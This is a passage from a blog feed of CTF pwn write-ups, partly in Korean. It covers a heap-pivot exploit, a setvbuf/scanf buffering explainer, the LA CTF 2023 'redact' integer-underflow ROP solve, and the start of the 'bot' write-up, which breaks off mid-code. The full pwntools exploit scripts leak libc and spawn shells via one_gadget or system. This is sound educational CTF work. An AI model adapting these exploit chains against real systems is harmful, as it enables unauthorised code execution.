NULL</span><br></pre></td></tr></table></figure></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;lac.tf&#x27;, 31182)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401234</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) leak the heap</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;stuff\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># heap pivoting</span></span><br><span class="line"><span class="comment"># fread(ptr, 1uLL, 0x20uLL, stdin);</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload += p64(<span class="number">0x40120f</span>) <span class="comment"># fread gadget</span></span><br><span class="line">payload += p64(heap-<span class="number">0x1008</span>)</span><br><span class="line">payload += p64(leave_ret) <span class="comment"># 0x20</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p.send(p64(heap-0x1008) * 2 + p64(e.plt[&#x27;printf&#x27;]) + p64(0x4011f6))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]) <span class="comment"># fread -&gt; printf :: set rsi to libc</span></span><br><span class="line">payload += p64(<span class="number">0x4011f6</span>) <span class="comment"># print libc</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;leak: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - <span class="number">0x1d5a40</span></span><br><span class="line">info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (4)</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4d1a0</span></span><br><span class="line">pop_rbx = libc.address + <span class="number">0x0000000000031f61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rbx) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> setvbuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - setvbuf</title>
      <link href="/230223-pwn-setvbuf/"/>
      <url>/230223-pwn-setvbuf/</url>
      
        <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>얼마 전 문제를 풀다가 처음 보는 개념이 나와서 정리해보려고 한다. <code>scanf(&quot;%d&quot;, &amp;n)</code>으로 int형 값을 입력받는데 이상하게 오버플로우(?)가 발생하지도 않는데 데이터가 heap에 저장되는 것이다. write up을 살펴봐도 익스 코드만 있고 heap에 paylaod를 pivot한다는 식만 주석으로 간단하게 적혀있어서 왜 heap에 payload가 저장되는지 이해하기가 힘들었다. 이에 대해 간단하게 알아보자.</p><p>결론을 말하면 <code>setvbuf</code> 함수 때문이었다.</p><h2 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a><code>setvbuf</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">int setvbuf(FILE* stream, char* buffer, int mode, size_t size);</span><br></pre></td></tr></table></figure><p>스트림 버퍼 방식을 변경한다. <code>버퍼링</code>은 시스템 자원을 효율적으로 사용하기 위해 데이터를 버퍼라는 공간에 담아두고 사용하는 것을 의미한다. 버퍼링을 하지 않으면 버퍼라는 공간을 쓰지 않는 걸로 해석된다. </p><p>인자를 살펴보자.</p><ul><li><code>File* stream</code><ul><li>작업을 수행할 열린 스트림의 <code>FILE</code> 객체를 가리키는 포인터</li><li>포너블 문제를 풀어본 경험이 있다면 <code>main</code> 초반에 <code>stdin</code>, <code>stdout</code>, <code>stderr</code> 등을 본 경험이 있을 것이다.</li></ul></li><li><code>char* buffer</code><ul><li>유저가 할당한 버퍼인데 포너블 문제를 풀어본 경험이 있다면 보통 <code>NULL</code>로 설정되어 있다.</li><li><code>NULL</code>이라면 함수는 자동으로 지정한 크기의 버퍼를 할당하게 된다.</li></ul></li><li><code>int mode</code><ul><li>파일 버퍼링의 형식을 지정하는데 3가지가 있다.</li><li><code>_IOFBF</code>: 버퍼가 다 차지 않는 이상 쓰기 작업을 하지 않는다. 즉 버퍼에 <code>size</code> 바이트 이상 쓰이지 않는 이상 <code>stream</code>에 쓰이지 않는다.</li><li><code>_IOLBF</code>: 출력할 때 버퍼가 다 채워지거나 개행 문자가 입력 되었으면 데이터가 버퍼에서 출력되고, 입력 시에는 개행문자까지 입력받는다.</li><li><code>_IOLBF</code>: 포너블 문제를 풀어본 경험이 있다면 보통은 이 경우다. 버퍼를 사용하지 않겠다는 뜻이다. <code>stdout</code>와 <code>stderr</code>는 보통 이 모드로 설정한다.</li></ul></li><li><code>size_t size</code><ul><li>지정할 버퍼의 크기의 단위</li><li><code>NULL</code>이라면 컴퓨터가 알아서 최소의 크기를 지정한다.</li></ul></li></ul><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">// 있는 것과 없는 것의 차이?</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>예시 코드이다. 입력으로는 아래를 보냈다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p>내 예상으로는 1만 <code>n</code>에 들어가고 (<code>setvbuf</code>가 있던 말던 ㅎ;) 나머지는 입력이 다 씹힐 것이라고 생각했다. </p><ul><li><code>setvbuf(stdin, 0, 2, 0)</code>가 없는 경우</li></ul><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 17.41.21.png" width=400/><br><p>일단 stack을 살펴보면 지역변수 <code>n</code> 자리에 1만 정상적으로 들어간 모습을 확인할 수 있다. 하지만 heap 상황은 어떨까?</p><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 17.40.39.png" width=600/><br><p><code>scanf</code> 로직에 의해 malloc을 하고 버퍼링을 한다. heap에다가 1을 포함한 값들을 씹지 않고 저장한 모습을 볼 수 있다. 후에 이 값은 나중에 <code>scanf</code>로 값을 다시 입력받을 때 사용자에게 입력받지 않고 이 공간에서 꺼내서 씀으로써 속도 등의 측면에서 성능을 항상시킨다고 한다.</p><p>포너블 문제에서 해당 구문이 있는 것은 이 때문인데, 이것이 없으면 입력과 출력 간의 순서가 모호해지고 leak한 값을 출력을 해야하는데 출력이 안될 수도 있다. 그래서 <code>setvbuf</code> 함수로 버퍼를 사용하지 않는, 즉 버퍼링을 하지 않아야 한다. </p><ul><li><code>setvbuf(stdin, 0, 2, 0)</code>가 있는 경우</li></ul><img src="/images/230223-pwn-setvbuf/Screenshot 2023-02-23 at 18.37.28.png" width=700/><br><p>디버깅으로 확인했는데 단호하게 1 뒤에 값은 다 씹는다. </p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>포너블 문제에서 일반적으로 <code>setvbuf(stdin, 0, 2, 0)</code>와 같은 구문이 있어야한다. 하지만 없는 경우도 있다. 저 구문이 없고 <code>scanf</code>와 같은 함수(malloc을 시도하는 함수)로 사용자에 입력을 받는다면? heap에 payload를 저장해서 ROP를 시도하는 방향으로 진행해봐도 좋을 듯하다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> setvbuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - redact (CPP, std::string)</title>
      <link href="/230216-lactf2023-redact/"/>
      <url>/230216-lactf2023-redact/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code></p></blockquote><ul><li>[46 solves &#x2F; 476 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter some text: &quot;</span>;</span><br><span class="line">  std::string text;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, text)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read text\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter a placeholder: &quot;</span>;</span><br><span class="line">  std::string placeholder;</span><br><span class="line">  <span class="keyword">if</span> (!std::<span class="built_in">getline</span>(std::cin, placeholder)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read placeholder\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Enter the index of the stuff to redact: &quot;</span>;</span><br><span class="line">  <span class="type">int</span> index;</span><br><span class="line">  <span class="keyword">if</span> (!(std::cin &gt;&gt; index)) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Failed to read index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; text.<span class="built_in">size</span>() - placeholder.<span class="built_in">size</span>()) &#123; <span class="comment">// [*]</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Invalid index\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  std::<span class="built_in">copy</span>(placeholder.<span class="built_in">begin</span>(), placeholder.<span class="built_in">end</span>(), text.<span class="built_in">begin</span>() + index); <span class="comment">// [**]</span></span><br><span class="line">  std::cout &lt;&lt; text &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Look at the <code>[*]</code>. The <code>text.size()</code> and <code>placeholder.size()</code> are <code>size_t</code>. It means <code>unsigned</code>. But <code>index</code> is just <code>int</code>.<br>If <code>text.size()</code> is 0 and <code>placeholder.size()</code> is 8, the result of <code>text.size() - placeholder.size()</code> is normally -8(When it is <code>signed</code>..). But it is not. Becuase of their type is <code>unsigned</code>, the result of that is very big int. </p><p>If <code>text</code> is stored in stack, it can cause the BOF at <code>[**]</code>. We can trigger this, but We need to know the how <code>std::string</code> is stored in memory.</p><p>Here is the structure of that <code>std::string</code> is stored in memory.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>When <code>Data Size</code> is over <code>0x10</code>, <code>Data Pointer</code> is placed in heap. This mean that normally is placed in stack. You can use this feacture for exploit.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc</li><li>use the one gadget</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31281</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./redact2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># === first main ===</span></span><br><span class="line"></span><br><span class="line">rop1 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop1.call(<span class="string">&quot;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc&quot;</span>, [e.symbols[<span class="string">&quot;_ZSt4cout&quot;</span>], e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]])</span><br><span class="line">rop1.raw(rop1.find_gadget([<span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">rop1.main()</span><br><span class="line"></span><br><span class="line">info(rop1.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;text: &quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop1.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop1.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># === second main ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0xc961a execve(&quot;/bin/sh&quot;, r12, r13)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="comment">#   [r13] == NULL || r13 == NULL</span></span><br><span class="line">rop2 = ROP(e, badchars=<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop2(r12=<span class="number">0</span>, r13=<span class="number">0</span>)</span><br><span class="line">rop2.raw(libc.address + <span class="number">0xc961a</span>) <span class="comment"># one gadget </span></span><br><span class="line"></span><br><span class="line">info(rop2.dump())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;placeholder: &quot;</span>, rop2.generatePadding(<span class="number">0</span>, <span class="number">72</span>) + rop2.chain())</span><br><span class="line">p.sendlineafter(<span class="string">&quot;redact: &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I use the <code>ROP</code> function first time that pwntools have. It is comfortable than I thought.</p><p>If you want to understand leak process, you need to understand <code>C++ style print</code>.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/images/230216-lactf2023-redact/Screenshot 2023-02-15 at 21.44.35.png" width=700/><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;1_l0v3_c++_L2zuBdqJABGU&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py">https://github.com/uclaacm/lactf-archive/blob/master/2023/pwn/redact/solve.py</a></li><li><a href="https://docs.pwntools.com/en/stable/rop/rop.html">https://docs.pwntools.com/en/stable/rop/rop.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
            <tag> integer underflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - bot</title>
      <link href="/230215-lactf2023-bot/"/>
      <url>/230215-lactf2023-bot/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[197 solves &#x2F; 363 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> give_flag = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hi, how can i help?&quot;</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;lol no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;help, i have no idea how to solve this&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;L&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;may i have the flag?&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;not with that attitude&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(input, <span class="string">&quot;please please please give me the flag&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i&#x27;ll consider it&quot;</span>);</span><br><span class="line">    sleep(<span class="number">15</span>);</span><br><span class="line">    <span class="keyword">if</span> (give_flag) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ok here&#x27;s your flag&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;sorry, i didn&#x27;t understand your question&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>give_flag</code> 변수 값을 입력 값을 통해서 바꿔줄 수가 없다. 다행히 <code>system</code> 함수 주소가 존재하니 bss 영역에 ‘&#x2F;bin&#x2F;sh\x00’을 쓰고 <code>system</code> 함수를 실행시키면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31180</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x40133b</span></span><br><span 